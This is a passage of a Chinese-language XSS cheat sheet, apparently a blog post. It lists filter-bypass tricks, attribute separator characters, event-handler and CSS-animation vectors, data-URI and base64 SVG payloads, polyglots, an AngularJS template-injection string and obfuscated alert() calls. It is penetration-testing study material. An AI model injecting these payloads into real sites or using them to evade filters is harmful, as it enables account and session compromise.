+<h6 id="一般可以绕过下面的验证："><a href="#一般可以绕过下面的验证：" class="headerlink" title="一般可以绕过下面的验证："></a>一般可以绕过下面的验证：</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filterXss</span>(<span class="params">string</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> regExp=<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">"[a-zA-Z]"</span>);</span><br><span class="line">    <span class="keyword">return</span> !regExp.test(string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="你可能会想那么我们直接这样过滤就好了："><a href="#你可能会想那么我们直接这样过滤就好了：" class="headerlink" title="你可能会想那么我们直接这样过滤就好了："></a>你可能会想那么我们直接这样过滤就好了：</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filterXss</span>(<span class="params">string</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> regExp=<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">"[\\(&#123;]"</span>);</span><br><span class="line">    <span class="keyword">return</span> !regExp.test(string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="但是上面的过滤是错误的，因为开发人员认为-是-的集合，而实际上，RegExp方式创建正则表达式时，需要写成-，原因是：原因是：-在字符串里是转义符，在正则里也是转义符。"><a href="#但是上面的过滤是错误的，因为开发人员认为-是-的集合，而实际上，RegExp方式创建正则表达式时，需要写成-，原因是：原因是：-在字符串里是转义符，在正则里也是转义符。" class="headerlink" title="但是上面的过滤是错误的，因为开发人员认为[\\({]是\,(,{的集合，而实际上，RegExp方式创建正则表达式时，需要写成[\\\\({]，原因是：原因是：\在字符串里是转义符，在正则里也是转义符。"></a>但是上面的过滤是错误的，因为开发人员认为<code>[\\({]</code>是<code>\</code>,<code>(</code>,<code>{</code>的集合，而实际上，RegExp方式创建正则表达式时，需要写成<code>[\\\\({]</code>，原因是：原因是：<code>\</code>在字符串里是转义符，在正则里也是转义符。</h6><h6 id="假如这个正则表达式-，不允许-，-那么还可以执行javascript代码吗？答案是肯定的，如下："><a href="#假如这个正则表达式-，不允许-，-那么还可以执行javascript代码吗？答案是肯定的，如下：" class="headerlink" title="假如这个正则表达式[\\({]，不允许(，{那么还可以执行javascript代码吗？答案是肯定的，如下："></a>假如这个正则表达式<code>[\\({]</code>，不允许<code>(</code>，<code>{</code>那么还可以执行javascript代码吗？答案是肯定的，如下：</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.href=<span class="string">"javascript:alert%281%29"</span>;</span><br></pre></td></tr></table></figure>
+
+<h6 id="使用location-href来执行js，并且将其中的括号与花括号进行URL编码。"><a href="#使用location-href来执行js，并且将其中的括号与花括号进行URL编码。" class="headerlink" title="使用location.href来执行js，并且将其中的括号与花括号进行URL编码。"></a>使用location.href来执行js，并且将其中的括号与花括号进行URL编码。</h6><h6 id="最后给出我的过滤："><a href="#最后给出我的过滤：" class="headerlink" title="最后给出我的过滤："></a>最后给出我的过滤：</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filterXss</span>(<span class="params">string</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> regExp=<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">"[a-zA-Z\\\\(&#123;]"</span>);</span><br><span class="line">    <span class="keyword">return</span> !regExp.test(string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="2-标签-属性分割符"><a href="#2-标签-属性分割符" class="headerlink" title="2.标签-属性分割符"></a>2.标签-属性分割符</h5><h6 id="有些过滤器会“天真地认为”只有某些特定字符可以分隔标签及其属性，下面给出的是在Firefox和Chrome中能够使用的有效分隔符的完整列表："><a href="#有些过滤器会“天真地认为”只有某些特定字符可以分隔标签及其属性，下面给出的是在Firefox和Chrome中能够使用的有效分隔符的完整列表：" class="headerlink" title="有些过滤器会“天真地认为”只有某些特定字符可以分隔标签及其属性，下面给出的是在Firefox和Chrome中能够使用的有效分隔符的完整列表："></a>有些过滤器会“天真地认为”只有某些特定字符可以分隔标签及其属性，下面给出的是在Firefox和Chrome中能够使用的有效分隔符的完整列表：</h6><table>
+<thead>
+<tr>
+<th align="center">十进制值</th>
+<th align="center">URL编码</th>
+<th align="center">介绍</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">47</td>
+<td align="center">%2F</td>
+<td align="center">正斜杠</td>
+</tr>
+<tr>
+<td align="center">13</td>
+<td align="center">%0D</td>
+<td align="center">回车</td>
+</tr>
+<tr>
+<td align="center">12</td>
+<td align="center">%0C</td>
+<td align="center">分页符</td>
+</tr>
+<tr>
+<td align="center">10</td>
+<td align="center">%0A</td>
+<td align="center">换行</td>
+</tr>
+<tr>
+<td align="center">9</td>
+<td align="center">%09</td>
+<td align="center">水平制表符</td>
+</tr>
+</tbody></table>
+<h6 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h6><h6 id="一般来说，你的Payload构造如下："><a href="#一般来说，你的Payload构造如下：" class="headerlink" title="一般来说，你的Payload构造如下："></a>一般来说，你的Payload构造如下：</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">"alert(1)"</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="你可以尝试使用上述字符来替换svg和onload中间的空格，这样就可以保证HTML仍然有效并且Payload能够正确执行-DEMO-有效的HTML-："><a href="#你可以尝试使用上述字符来替换svg和onload中间的空格，这样就可以保证HTML仍然有效并且Payload能够正确执行-DEMO-有效的HTML-：" class="headerlink" title="你可以尝试使用上述字符来替换svg和onload中间的空格，这样就可以保证HTML仍然有效并且Payload能够正确执行(DEMO:有效的HTML)："></a>你可以尝试使用上述字符来替换<code>svg</code>和<code>onload</code>中间的空格，这样就可以保证HTML仍然有效并且Payload能够正确执行(DEMO:<a href="https://netsec.expert/public/examples/valid-html.html" target="_blank" rel="noopener">有效的HTML</a>)：</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;<span class="name">svg</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">svg</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">    <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;<span class="name">svg</span>&gt;</span> # newline char</span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">svg</span>	<span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;<span class="name">svg</span>&gt;</span> # tab char</span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">svg</span></span></span><br><span class="line"><span class="tag"><span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;<span class="name">svg</span>&gt;</span> # new page char (0xc)</span><br></pre></td></tr></table></figure>
+
+<h5 id="3-基于javascript事件的xss"><a href="#3-基于javascript事件的xss" class="headerlink" title="3.基于javascript事件的xss"></a>3.基于javascript事件的xss</h5><h6 id="详细参考资料：更多的HTML事件"><a href="#详细参考资料：更多的HTML事件" class="headerlink" title="详细参考资料：更多的HTML事件"></a>详细参考资料：<a href="https://developer.mozilla.org/en-US/docs/Web/Events" target="_blank" rel="noopener">更多的HTML事件</a></h6><h6 id="标准HTML事件"><a href="#标准HTML事件" class="headerlink" title="标准HTML事件"></a><code>标准HTML事件</code></h6><h6 id="0点击事件："><a href="#0点击事件：" class="headerlink" title="0点击事件："></a>0点击事件：</h6><table>
+<thead>
+<tr>
+<th align="center">事件名称</th>
+<th align="center">标签</th>
+<th align="center">备注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">onload</td>
+<td align="center">body, iframe, img, frameset, input, script, style, link, svg</td>
+<td align="center">适用于0-click，但通常会被过滤掉</td>
+</tr>
+<tr>
+<td align="center">onpageshow</td>
+<td align="center">body</td>
+<td align="center">适用于 0-click，但只能用在非DOM注入中</td>
+</tr>
+<tr>
+<td align="center">onfocus</td>
+<td align="center">大多数标签</td>
+<td align="center">适用于 0-click：配合autofocus=””使用</td>
+</tr>
+<tr>
+<td align="center">onmouseover</td>
+<td align="center">大多数标签</td>
+<td align="center">如果可能的话，添加参数值来让其尽可能的大。</td>
+</tr>
+<tr>
+<td align="center">onerror</td>
+<td align="center">img, input, object, link, script, video, audio</td>
+<td align="center">确保传递参数来终止运行</td>
+</tr>
+<tr>
+<td align="center">onanimationstart</td>
+<td align="center">与任何可以设置动画的元素组合</td>
+<td align="center">启动，然后开始CSS动画</td>
+</tr>
+<tr>
+<td align="center">onanimationend</td>
+<td align="center">与任何可以设置动画的元素组合</td>
+<td align="center">启动，然后结束CSS动画</td>
+</tr>
+<tr>
+<td align="center">onstart</td>
+<td align="center">marquee</td>
+<td align="center">在字幕动画启动时启动-仅限Firefox</td>
+</tr>
+<tr>
+<td align="center">onfinish</td>
+<td align="center">marquee</td>
+<td align="center">在字幕动画启动时启动-仅限Firefox</td>
+</tr>
+<tr>
+<td align="center">ontoggle</td>
+<td align="center">details</td>
+<td align="center">必须提供’opne’参数以支持0-click</td>
+</tr>
+</tbody></table>
+<h6 id="使用样例："><a href="#使用样例：" class="headerlink" title="使用样例："></a>使用样例：</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">alert()</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert()</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert()</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span> <span class="attr">onpageshow</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"width:1000px;height:1000px"</span> <span class="attr">onmouseover</span>=<span class="string">alert()</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">marquee</span> <span class="attr">width</span>=<span class="string">10</span> <span class="attr">loop</span>=<span class="string">2</span> <span class="attr">behavior</span>=<span class="string">"alternate"</span> <span class="attr">onbounce</span>=<span class="string">alert()</span>&gt;</span> (firefox only)</span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">marquee</span> <span class="attr">onstart</span>=<span class="string">alert(1)</span>&gt;</span> (firefox only)</span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">marquee</span> <span class="attr">loop</span>=<span class="string">1</span> <span class="attr">width</span>=<span class="string">0</span> <span class="attr">onfinish</span>=<span class="string">alert(1)</span>&gt;</span> (firefox only)</span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">autofocus</span>=<span class="string">""</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">input</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">"alert()"</span>&gt;</span>  (chrome &amp; opera only)</span><br><span class="line">``` </span><br><span class="line">###### HTML5事件</span><br><span class="line">###### 0点击事件：</span><br><span class="line">| 事件名称               | 标签                                    | 备注                                                       |</span><br><span class="line">| :-------------------: | :-----------------------------------:   | :-------------------------------------------------------:  |</span><br><span class="line">| onplay            	| video, audio            	              |  适用于0-click：结合HTML的autoplay属性以及结合有效的视频/音频 |           </span><br><span class="line">| onplaying             | video, audio            	              |  适用于0-click: 结合HTML的autoplay属性以及结合有效的视频/音频 |           </span><br><span class="line">| oncanplay             | video, audio            	              |  必须链接有效的视频/音频                                     |</span><br><span class="line">| onloadeddat           | video, audio            	              |  必须链接有效的视频/音频                                     |</span><br><span class="line">| onloadedmetada        | video, audio            	              |  必须链接有效的视频/音频            |</span><br><span class="line">| onprogress            | video, audio            	              |  必须链接有效的视频/音频            |</span><br><span class="line">| onloadstar            | video, audio            	              |  潜在的0-click向量            |</span><br><span class="line">| oncanplay             | video, audio            	              |  必须链接有效的视频/音频    |</span><br><span class="line"></span><br><span class="line">###### 使用样例：</span><br><span class="line">```html</span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">autoplay</span> <span class="attr">onloadstart</span>=<span class="string">"alert()"</span> <span class="attr">src</span>=<span class="string">x</span>&gt;</span><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">video</span> <span class="attr">autoplay</span> <span class="attr">controls</span> <span class="attr">onplay</span>=<span class="string">"alert()"</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">"http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4"</span>&gt;</span><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">video</span> <span class="attr">controls</span> <span class="attr">onloadeddata</span>=<span class="string">"alert()"</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">"http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4"</span>&gt;</span><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">video</span> <span class="attr">controls</span> <span class="attr">onloadedmetadata</span>=<span class="string">"alert()"</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">"http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4"</span>&gt;</span><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">video</span> <span class="attr">controls</span> <span class="attr">onloadstart</span>=<span class="string">"alert()"</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">"http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4"</span>&gt;</span><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">video</span> <span class="attr">controls</span> <span class="attr">onloadstart</span>=<span class="string">"alert()"</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">x</span>&gt;</span><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">video</span> <span class="attr">controls</span> <span class="attr">oncanplay</span>=<span class="string">"alert()"</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">"http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4"</span>&gt;</span><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">audio</span> <span class="attr">autoplay</span> <span class="attr">controls</span> <span class="attr">onplay</span>=<span class="string">"alert()"</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">"http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4"</span>&gt;</span><span class="tag">&lt;/<span class="name">audio</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">audio</span> <span class="attr">autoplay</span> <span class="attr">controls</span> <span class="attr">onplaying</span>=<span class="string">"alert()"</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">"http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4"</span>&gt;</span><span class="tag">&lt;/<span class="name">audio</span>&gt;</span></span><br><span class="line">```             </span><br><span class="line"></span><br><span class="line">##### 4.基于CSS的事件</span><br><span class="line">###### 不幸的是，基于CSS来实现XSS现在已经越来越难了，我尝试过的所有向量目前都只能在非常旧的浏览器上工作。因此，下面介绍的是基于CSS来触发XSS的情况。</span><br><span class="line">###### 下面的例子使用的是style标签来为动画的开始和结束设置关键帧：</span><br><span class="line">```html</span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css">@<span class="keyword">keyframes</span> x &#123;&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"animation: x;"</span> <span class="attr">onanimationstart</span>=<span class="string">"alert()"</span>&gt;</span>XSS<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"animation: x;"</span> <span class="attr">onanimationend</span>=<span class="string">"alert()"</span>&gt;</span>XSS<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="5-古怪的XSS向量"><a href="#5-古怪的XSS向量" class="headerlink" title="5.古怪的XSS向量"></a>5.古怪的XSS向量</h5><h6 id="下面给出的是一些比较”奇葩”的XSS测试向量，这些测试向量很少见："><a href="#下面给出的是一些比较”奇葩”的XSS测试向量，这些测试向量很少见：" class="headerlink" title="下面给出的是一些比较”奇葩”的XSS测试向量，这些测试向量很少见："></a>下面给出的是一些比较”奇葩”的XSS测试向量，这些测试向量很少见：</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">animate</span> <span class="attr">onbegin</span>=<span class="string">alert()</span> <span class="attr">attributeName</span>=<span class="string">x</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">"data:text/html,&lt;script&gt;alert(5)&lt;/script&gt;"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srcdoc</span>=<span class="string">"&lt;svg onload=alert(4);&gt;"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">javascript:alert(3)</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javascript:alert(2)</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">javascript:alert(1)</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">"data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+"</span> <span class="attr">type</span>=<span class="string">"image/svg+xml"</span> <span class="attr">AllowScriptAccess</span>=<span class="string">"always"</span>&gt;</span><span class="tag">&lt;/<span class="name">embed</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczL**yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="</span>&gt;</span><span class="tag">&lt;/<span class="name">embed</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="6-XSS多覆盖样例"><a href="#6-XSS多覆盖样例" class="headerlink" title="6.XSS多覆盖样例"></a>6.XSS多覆盖样例</h5><h6 id="下面我给出了几份XSS的多段代码，因为有的时候我们只需要输入特定的字符，或者只需要一个基于DOM或基于非DOM的注入场景。"><a href="#下面我给出了几份XSS的多段代码，因为有的时候我们只需要输入特定的字符，或者只需要一个基于DOM或基于非DOM的注入场景。" class="headerlink" title="下面我给出了几份XSS的多段代码，因为有的时候我们只需要输入特定的字符，或者只需要一个基于DOM或基于非DOM的注入场景。"></a>下面我给出了几份XSS的多段代码，因为有的时候我们只需要输入特定的字符，或者只需要一个基于DOM或基于非DOM的注入场景。</h6><table>
+<thead>
+<tr>
+<th align="center">字符</th>
+<th align="center">使用</th>
+<th align="center">多段代码</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">141</td>
+<td align="center">DOM和非DOM</td>
+<td align="center">javascript:”/*‘/*`/*–&gt;&lt;html &quot; onmouseover=/*&lt;svg/*/onload=alert()//&gt;</td>
+</tr>
+<tr>
+<td align="center">88</td>
+<td align="center">非DOM</td>
+<td align="center">“‘–&gt;<script>alert()</script></td>
+</tr>
+<tr>
+<td align="center">95</td>
+<td align="center">DOM</td>
+<td align="center">‘“–&gt;<svg onload="alert()"/></td>
+</tr>
+<tr>
+<td align="center">54</td>
+<td align="center">非DOM</td>
+<td align="center">“‘&gt;–&gt;*/&lt;/ti tle&gt;<script>alert()</script></td>
+</tr>
+<tr>
+<td align="center">42</td>
+<td align="center">DOM</td>
+<td align="center">“‘–&gt;<svg onload="alert()"/></td>
+</tr>
+</tbody></table>
+<h5 id="7-框架"><a href="#7-框架" class="headerlink" title="7.框架"></a>7.框架</h5><h6 id="为了攻击框架，我们还需要对相关的模板语言进行研究和分析。"><a href="#为了攻击框架，我们还需要对相关的模板语言进行研究和分析。" class="headerlink" title="为了攻击框架，我们还需要对相关的模板语言进行研究和分析。"></a>为了攻击框架，我们还需要对相关的模板语言进行研究和分析。</h6><h6 id="AngularJS"><a href="#AngularJS" class="headerlink" title="AngularJS"></a>AngularJS</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="keyword">constructor</span>.<span class="keyword">constructor</span>('alert(1)')()&#125;&#125;</span><br><span class="line">```     </span><br><span class="line">###### 这个Payload适用于大多数场景，但如果你还需要更多的Payload，可以点击【[这里](https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs)】获取。</span><br><span class="line">###### 8.Mavo</span><br><span class="line">```javascript</span><br><span class="line">[self.alert(1)]</span><br></pre></td></tr></table></figure>
+
+<h5 id="9-XSS过滤器绕过"><a href="#9-XSS过滤器绕过" class="headerlink" title="9.XSS过滤器绕过"></a>9.XSS过滤器绕过</h5><h6 id="圆括号过滤"><a href="#圆括号过滤" class="headerlink" title="圆括号过滤"></a>圆括号过滤</h6><h6 id="利用HTML解析器和JS语句："><a href="#利用HTML解析器和JS语句：" class="headerlink" title="利用HTML解析器和JS语句："></a>利用HTML解析器和JS语句：</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert</span>`<span class="attr">1</span>`&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert&amp;lpar;1&amp;rpar;</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert&amp;#x28;1&amp;#x29</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert&amp;#40;1&amp;#41</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="限制字符集"><a href="#限制字符集" class="headerlink" title="限制字符集"></a>限制字符集</h6><h6 id="下面这三个站点可以将有效的JS代码转换为所谓的“乱码”来绕过绝大多数的过滤器："><a href="#下面这三个站点可以将有效的JS代码转换为所谓的“乱码”来绕过绝大多数的过滤器：" class="headerlink" title="下面这三个站点可以将有效的JS代码转换为所谓的“乱码”来绕过绝大多数的过滤器："></a>下面这三个站点可以将有效的JS代码转换为所谓的“乱码”来绕过绝大多数的过滤器：</h6><h6 id="1、JSFuck"><a href="#1、JSFuck" class="headerlink" title="1、JSFuck"></a>1、JSFuck</h6><h6 id="2、JSFsck-不带圆括号的JSFuck"><a href="#2、JSFsck-不带圆括号的JSFuck" class="headerlink" title="2、JSFsck(不带圆括号的JSFuck)"></a>2、JSFsck(不带圆括号的JSFuck)</h6><h6 id="3、jjencode"><a href="#3、jjencode" class="headerlink" title="3、jjencode"></a>3、jjencode</h6><h6 id="关键词过滤"><a href="#关键词过滤" class="headerlink" title="关键词过滤"></a>关键词过滤</h6><h6 id="避免使用的关键词："><a href="#避免使用的关键词：" class="headerlink" title="避免使用的关键词："></a>避免使用的关键词：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">(alert)(1)</span><br><span class="line">(1,2,3,4,5,6,7,8,alert)(1)</span><br><span class="line">a=alert,a(1)</span><br><span class="line">[1].find(alert)</span><br><span class="line">top[&quot;al”+”ert&quot;](1)</span><br><span class="line">top[/al/.source+/ert/.source](1)</span><br><span class="line">alu0065rt(1)</span><br><span class="line">top[&apos;al145rt&apos;](1)</span><br><span class="line">top[&apos;alx65rt&apos;](1)</span><br><span class="line">top[8680439..toString(30)](1) // Generated using 